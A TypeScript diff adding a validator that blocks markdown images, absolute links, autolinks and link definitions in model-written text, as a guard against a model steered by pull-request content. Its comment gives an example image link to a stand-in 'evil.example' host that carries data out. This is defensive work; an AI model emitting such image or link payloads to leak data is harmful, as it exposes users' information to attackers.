@@ -81,10 +81,27 @@ const isSpace = (cp: number): boolean => WHITESPACE.test(String.fromCodePoint(cp
 const isVisible = (cp: number | undefined): cp is number =>
   cp !== undefined && !isJoiner(cp) && !isVariationSelector(cp) && !isSpace(cp);
 
+// --- Links and images (schema 1.1, P4-4, ADR 0015 I12) ---------------------------------------
+//
+// Model text is rendered as markdown. An image loads on sight, so a model steered by PR content
+// could exfiltrate (`![x](https://evil.example/?d=…)`), and a link can phish. Prose, single-line
+// text and agent prompts may therefore hold no markdown image, no link to an absolute or
+// protocol-relative URL, no autolink and no link definition. Relative links, bracketed words and
+// code that looks like a call (`handlers[name](req)`) stay. Code lines are code, never markdown.
+const MARKUP: readonly RegExp[] = [
+  /!\[[^\]\n]*\]\s*[([]/u,
+  /\]\(\s*<?\s*(?:[a-z][a-z0-9+.-]*:|\/\/)/iu,
+  /<[a-z][a-z0-9+.-]{1,31}:[^\s<>]*>/iu,
+  /^[ \t]{0,3}\[[^\]\n]+\]:[ \t]*\S/mu,
+];
+const MARKUP_KINDS: ReadonlySet<TextKind> = new Set(["prose", "strict", "line"]);
+
 /** Why `text` is not acceptable as the given kind of text, or undefined when it is. */
 export const textProblem = (text: string, kind: TextKind): string | undefined => {
   if (!text.isWellFormed()) return "must not contain lone surrogates";
   if (FORBIDDEN[kind].test(text)) return FORBIDDEN_MESSAGE[kind];
+  if (MARKUP_KINDS.has(kind) && MARKUP.some((pattern) => pattern.test(text)))
+    return "must not contain a markdown image, an absolute link, an autolink or a link definition";
 
   const points = Array.from(text, (character) => character.codePointAt(0) ?? 0);
   const cap = MARK_RUN_CAP[kind];
